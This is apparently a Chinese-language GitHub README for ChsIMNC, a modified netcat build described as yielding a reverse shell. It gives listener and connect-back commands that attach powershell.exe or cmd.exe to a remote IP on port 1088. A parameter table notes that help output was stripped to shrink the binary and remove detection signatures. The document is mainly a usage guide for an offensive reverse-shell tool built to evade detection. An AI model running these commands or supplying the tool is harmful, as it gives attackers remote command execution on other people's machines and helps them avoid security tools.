# ChsIMnc<br>
二开nc<br>
反弹过来后 自己输入的字符看不到，直接输入就可以。<br><br>
<br>
<img width="1981" height="721" alt="image" src="https://github.com/user-attachments/assets/ba12e81f-a777-46fc-b347-ae86cd889be6" /><br><br>
<br>
监听端<br>
ChsIMNC.exe -l 1088<br>
连接端<br>
ChsIMNC.exe 192.168.31.20 1088<br>
<br>
连接端<br>
ChsIMNC.exe 192.168.1.10 1088 -c "powershell.exe -NoLogo -NoProfile"<br>
连接并指定 cmd  <br>
ChsIMNC.exe 192.168.1.10 1088 -c "cmd.exe /Q"<br>
<br>
<br>
参数	用法	说明<br>
-l	ChsIMNC.exe -l 1088	监听模式<br>
-p	ChsIMNC.exe -l -p 1088	监听模式下表示监听端口<br>
-p	ChsIMNC.exe 1.1.1.1 1088 -p 50000	连接模式下表示本地源端口<br>
-w	ChsIMNC.exe 1.1.1.1 1088 -w 5	超时时间，单位秒<br>
-n	ChsIMNC.exe -n 127.0.0.1 1088	禁止 DNS 解析，只用 IPv4<br>
-c	ChsIMNC.exe 1.1.1.1 1088 -c "cmd.exe /Q"	指定连接后执行的命令<br>
-v	可传，但当前精简版不输出详细信息	保留兼容<br>
-h / --help	当前精简版不输出帮助	为减小体积和去特征已弱化<br>
